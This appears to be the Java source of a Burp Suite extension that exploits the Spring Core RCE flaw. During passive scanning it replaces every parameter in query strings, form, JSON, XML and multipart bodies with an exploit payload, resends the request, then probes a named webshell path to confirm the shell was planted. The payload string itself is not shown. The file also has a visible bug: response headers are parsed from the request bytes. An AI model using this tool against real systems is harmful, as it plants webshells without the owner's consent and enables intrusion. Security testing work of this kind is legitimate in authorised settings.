package main;

import burp.*;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class SpringCoreRceMain implements IScannerCheck {
    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {
        byte[] raw_request = baseRequestResponse.getRequest();
        byte[] raw_response = baseRequestResponse.getResponse();
        IHttpRequestResponse newRequestResponse = null;

        IRequestInfo analyzedIRequestInfo = Utils.helpers.analyzeRequest(raw_request);
        IRequestInfo analyzedIResponseInfo = Utils.helpers.analyzeRequest(raw_request);

        List<String> raw_request_header = analyzedIRequestInfo.getHeaders();    // 获取请求头
        byte raw_content_type = analyzedIRequestInfo.getContentType();          // 获取Content-Type
        List<String> raw_response_header = analyzedIResponseInfo.getHeaders();  // 获取响应头
        IHttpService httpService = baseRequestResponse.getHttpService();       // 获取IHttpService

        // 第一行请求包含请求方法、请求uri、http版本
        String fLineRequestHeader = raw_request_header.get(0);
        String[] fLineHeaders = fLineRequestHeader.split(" ");


        // file Suffix black
        String[] blackSuffixArray = {".js",".png", ".jpg",".jpeg",".svg",".mp4",".css",".mp3",".ico",".woff","woff2",".gif"};
        for (String i : blackSuffixArray) {
            if (fLineHeaders[1].split("\\?")[0].endsWith(i))
                return null;
        }

        //增加响应包的Content-type黑名单
        String[] response_black_lists = {"Content-Type: image/jpeg","Content-Type: image/jpg","Content-Type: image/png"
                ,"Content-Type: application/octet-stream","Content-Type: text/css"};

        for (String response_header_single : raw_response_header){
            for (String response_black_single: response_black_lists)
            {
                if (response_black_single.equals(response_header_single))
                    return null;
            }
        }



        String uri = fLineHeaders[1].split("\\?",2)[0].replace("/",".");

        if (fLineHeaders[1].split("\\?")[0].replace("/",".").length() > 25) {
            uri = fLineHeaders[1].split("\\?")[0].replace("/",".").substring(0, 25);
        }

        String total_uri = "";
        String[] uris = uri.split("\\.");
        for(String uri_single:uris) {
            if (!uri_single.equals(""))
                total_uri = total_uri + "." + uri_single.charAt(0);
        }
        uri = total_uri;

        if (uri.endsWith("."))
            uri = uri.substring(0,uri.length()-1);

        StringBuilder uri_total = new StringBuilder();

        Payload payload = new Payload();
        payload.setPayload1();
        String vulnUrl = payload.getVulnUrl();


//        if ( !BurpExtender.this.log4j2passivepattern_box.isSelected() ) // 关闭被动扫描
//            return null;


        //fLineHeaders[0] 为请求方法
        //fLineHeaders[1] 为请求的uri
        //fLineHeaders[2] 为请求协议版本，无用

        // 获取body
        int bodyOffset = analyzedIRequestInfo.getBodyOffset();
        byte[] byte_Request = baseRequestResponse.getRequest();
        String body = new String(byte_Request).substring(bodyOffset); // 请求体

        /*
        Case 1: uri无参 直接在路径后面添加payload 无论什么请求
         */
        if(!fLineHeaders[1].contains("?")) {  // 无参情况，
            fLineHeaders[1] = fLineHeaders[1] + '?' +vulnUrl;
        }

        /*
        Case 2: 根据键名拼接Payload
         */
        else if (fLineHeaders[1].contains("?")) {
            String[] raw_request_query =  fLineHeaders[1].split("\\?",2);
            String[] reQueryArray = raw_request_query[1].split("&");

            for (String uriSingle : reQueryArray) {
                String[] uri_single_array = uriSingle.split("=");
                uri_total.append(uri_single_array[0]).append("=").append(vulnUrl).append("&");
            }
            uri_total = new StringBuilder(uri_total.substring(0, uri_total.length() - 1));

            fLineHeaders[1] = raw_request_query[0] + "?" + uri_total;
        }


        switch (raw_content_type){
            case IRequestInfo.CONTENT_TYPE_NONE:
                newRequestResponse = sendPayload(raw_request_header, fLineHeaders, payload, body, httpService);
                break;
            // POST PUT
            case IRequestInfo.CONTENT_TYPE_URL_ENCODED:
                if(body.contains("={")){
                 /*
                 Case 3: body => if[&,={] a=1&param={"a":"1","b":"22222"} or param={"a":"1","b":"22222"}
                 */
                    StringBuilder body_total = new StringBuilder();
                    String[] bodyParams = body.split("&");
                    for(String body_single : bodyParams) {
                        String[] body_single_lists = body_single.split("=");
                        if (body_single.contains("{")){
                            JSONObject jsonObject = JSON.parseObject(body_single_lists[1]);
                            jsonObject.replaceAll((k, v) -> vulnUrl);
                            body_total.append(body_single_lists[0]).append("=").append(jsonObject.toString()).append("&");
                        }else {
                            body_total.append(body_single_lists[0]).append("=").append(vulnUrl).append("&");
                        }
                    }
                    body_total = new StringBuilder(body_total.substring(0, body_total.length() - 1));
                    body = body_total.toString();

                }else if (body.contains("=")){
                /*
                Case 4: body => if[=]  a=1&b=2&c=3
                 */
                    StringBuilder body_total = new StringBuilder();
                    String[] bodyParams = body.split("&");
                    for(String body_single : bodyParams) {
                        String[] body_single_array = body_single.split("=");
                        body_total.append(body_single_array[0]).append("=").append(vulnUrl).append("&");
                    }
                    body_total = new StringBuilder(body_total.substring(0, body_total.length() - 1));
                    body = body_total.toString();
                }else if (body.contains("xml version") || body.contains("!DOCTYPE") || body.contains("%21DOCTYPE")){
                    try {
                        body = java.net.URLDecoder.decode(body, "UTF-8"); //可能出现编码问题吗？
                    } catch (UnsupportedEncodingException e) {
                        e.printStackTrace();
                    }
                    /*
                    Case 5: body => a=1&xml=<?xml version="1.0" encoding ="UTF-8"?>&c=3 or xml=<?xml ?>
                     */
                    StringBuilder body_total = new StringBuilder();
                    String[] bodyParams = body.split("&"); // 如果分隔符不存在返回本身
                    for (String body_single : bodyParams) {
                        if (!body_single.contains("?xml")) {  // 有些没有xml也是xml Todo
                            String[] body_single_lists = body_single.split("=");
                            body_total.append(body_single_lists[0]).append("=").append(vulnUrl).append("&");
                        } else {
                            String[] body_single_lists = body_single.split("=");
                            List<String> list = new ArrayList<>();
                            Pattern pattern = Pattern.compile(">(.*?)</");
                            Matcher m = pattern.matcher(body_single_lists[1]);
                            while (m.find()) {
                                list.add(m.group(1));
//                        System.out.println(m.group(1));
                            }
                            for (String str : list) {
                                body_single_lists[1] = body_single_lists[1].replace(">" + str + "</", ">" + vulnUrl+ "</");
                            }
                            body_total.append(body_single_lists[0]).append("=").append(body_single_lists[1]);
                        }
                    }
                    body_total = new StringBuilder(body_total.substring(0, body_total.length() - 1));
                    body = body_total.toString();
                } else {
                 /*
                Case 6: body => 无键值
                 */
                    body = vulnUrl;
                }

                newRequestResponse = sendPayload(raw_request_header, fLineHeaders, payload, body, httpService);
                break;
            case IRequestInfo.CONTENT_TYPE_MULTIPART:
                /*
                Case 7: body => multipart   Todo
                 */
                List<String> list_multipart = new ArrayList<>();
                Pattern multiPartPattern = Pattern.compile("\n(.*?)\r\n--");
                Matcher multiPartMatcher = multiPartPattern.matcher(body);
                while (multiPartMatcher.find()) {
                    list_multipart.add(multiPartMatcher.group(1));
//                    stdout.println(m.group(1));
                }
                for ( String str : list_multipart)
                    body = body.replace("\n" + str + "\r\n--" , "\n" + vulnUrl + "\r\n--");

                newRequestResponse = sendPayload(raw_request_header,fLineHeaders, payload, body, httpService);
                break;
            case IRequestInfo.CONTENT_TYPE_XML:
                /*
                Case 8: body => <?xml ?>
                 */
                List<String> list = new ArrayList<>();
                Pattern xmlPattern = Pattern.compile(">(.*?)</");
                Matcher xmlMatcher = xmlPattern.matcher(body);

                while (xmlMatcher.find()) {
                    list.add(xmlMatcher.group(1));
//                        System.out.println(m.group(1));
                }
                for (String str: list){
                    body = body.replace(">" + str + "</",">" + vulnUrl + "</");
                }
                newRequestResponse = sendPayload(raw_request_header,fLineHeaders, payload, body, httpService);
                break;
            case IRequestInfo.CONTENT_TYPE_JSON:
                /*
                Case 9: if[={]  json={"a":"1","b":"22222"}
                 */
                if (body.contains("={")){
                    String body_total = "";
                    if (body.contains("{")){
                        String[] body_single_lists = body.split(body.split("=")[0] + "=");
                        JSONObject jsonObject = JSON.parseObject(body_single_lists[1]);
                        jsonObject.replaceAll((k, v) -> vulnUrl);
                        body_total = body_total + body.split("=")[0] + "=" + jsonObject.toString();
                    }else {
                        String[] body_single_lists = body.split("=");
                        body_total = body_total + body_single_lists[0] + "=" + vulnUrl ;
                    }
                    body = body_total;
                }
                /*
                Case 10: if[:{ ] {"params":{"a":"1","b":"22222"}}
                 */
                else if (body.contains(":{")){
                    JSONObject jsonObject = JSON.parseObject(body);
                    for (String key:jsonObject.keySet()) {
                        if (jsonObject.getString(key).contains("{")){
                            JSONObject jsonObject2 = JSON.parseObject(jsonObject.getString(key));
                            jsonObject2.replaceAll((k, v) -> vulnUrl);
                            jsonObject.put(key,jsonObject2);
                        } else
                            jsonObject.put(key, vulnUrl);
                    }
                    body = jsonObject.toString();
                }
                /*
                Case11: if[:{,  ={ ] json={"params":{"a":"1","b":"22222"}}
                 */
                else if (body.contains(":{") && body.contains("={")){
                    String body_code = body;
                    body = body.split(body.split("=")[0] + "=")[1];

                    JSONObject jsonObject = JSON.parseObject(body);
                    for (String key:jsonObject.keySet()) {
                        if (jsonObject.getString(key).contains("{")){
                            JSONObject jsonObject2 = JSON.parseObject(jsonObject.getString(key));
                            jsonObject2.replaceAll((k, v) -> vulnUrl);
                            jsonObject.put(key,jsonObject2);
                        } else
                            jsonObject.put(key, vulnUrl);
                    }
                    body = body_code.split("=")[0] + "=" + jsonObject.toString();
                }else if (body.contains("{")){
                    /*
                    Case 12: if[{] {"a":"1","b":"22222"}
                     */
                    JSONObject jsonObject = JSON.parseObject(body);
                    jsonObject.replaceAll((k, v) -> vulnUrl);
                    body = jsonObject.toString();
                }
                newRequestResponse = sendPayload(raw_request_header,fLineHeaders, payload, body, httpService);
                break;

            case IRequestInfo.CONTENT_TYPE_AMF:
                // todo
                System.out.println("AMF");
                break;
            case IRequestInfo.CONTENT_TYPE_UNKNOWN:
                // todo
                System.out.println("UNKNOWN");
                break;
        }

        // 检测结果 Payload1 webShell返回200
//        String webShellHost = httpService.getProtocol() + "://" + httpService.getHost()+":"+httpService.getPort();
        String webShellHost = httpService.toString();
        String testUrl = webShellHost +"/"+ "DoYouHaveA0day" + payload.payload1_webShell_suffix;
        String webShellUrl = webShellHost  +"/"+ payload.payload1_webShell_name +payload.payload1_webShell_suffix;
        OkHttpClient okHttpClient = new OkHttpClient();
        System.out.println(testUrl);
        Request testReq = new Request.Builder()
                .url(testUrl)
                .get()
                .build();
        Request webShellReq = new Request.Builder()
                .url(webShellUrl)
                .get()
                .build();

        // todo DiffPage.java https://github.com/p0desta/AutoBypass403-BurpSuite/blob/main/Bypass403/src/main/java/Main/DiffPage.java
        Response httpResponseTest = null;
        Response httpResponsePayload = null;

        int testStatus = 0;
        long testLength = 0;
        try {
            httpResponseTest = okHttpClient.newCall(testReq).execute();
            testStatus = httpResponseTest.code();
        } catch (IOException e) {
            e.printStackTrace();
        }
        if (testStatus == 200){
            testLength = Objects.requireNonNull(httpResponseTest.body()).contentLength();
        }

        int shellStatus = 0;
        long shellLength = 0;
        try {
            httpResponsePayload = okHttpClient.newCall(webShellReq).execute();
            shellStatus = httpResponsePayload.code();
            if (shellStatus == 200){
                shellLength = Objects.requireNonNull(httpResponsePayload.body()).contentLength();
                if (shellLength != testLength){
                    addLog(httpResponsePayload, webShellUrl, newRequestResponse, shellLength);
                }else addLog(httpResponsePayload, "×", newRequestResponse, shellLength);
            }else addLog(httpResponsePayload, "×", newRequestResponse, shellLength);
        } catch (IOException e) {
            e.printStackTrace();
        }

        return null;
    }


    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        if (existingIssue.getIssueName().equals(newIssue.getIssueName()))
            return -1;
        return 0;
    }

    private void addLog(Response httpResponse, String result, IHttpRequestResponse messageInfo, long shellLength) {

        Utils.panel.getSpringCoreRceTableModel().getSpringCoreRceList().add(new SpringCoreRce(
                DateTimeFormatter.ofPattern("yy-MM-dd HH:mm:ss").format(LocalDateTime.now()),
                httpResponse.request().url().toString(),
                httpResponse.request().method(),
                shellLength,
                httpResponse.code(),
                result,
                Utils.callbacks.saveBuffersToTempFiles(messageInfo)
                ));
        Utils.panel.getSpringCoreRceTableModel().fireTableRowsInserted(0, 0);
    }

    private IHttpRequestResponse sendPayload(List<String> request_header,String[] fLineHeaders ,Payload payload, String body, IHttpService httpService){
        request_header.set(0, fLineHeaders[0] + " " + fLineHeaders[1] + " " + fLineHeaders[2]);
        if(payload.getPayload_header_list()!=null)
            request_header.addAll(payload.getPayload_header_list());

        byte[] new_request = Utils.helpers.buildHttpMessage(request_header, body.getBytes());

        return Utils.callbacks.makeHttpRequest(httpService, new_request);

    }
}
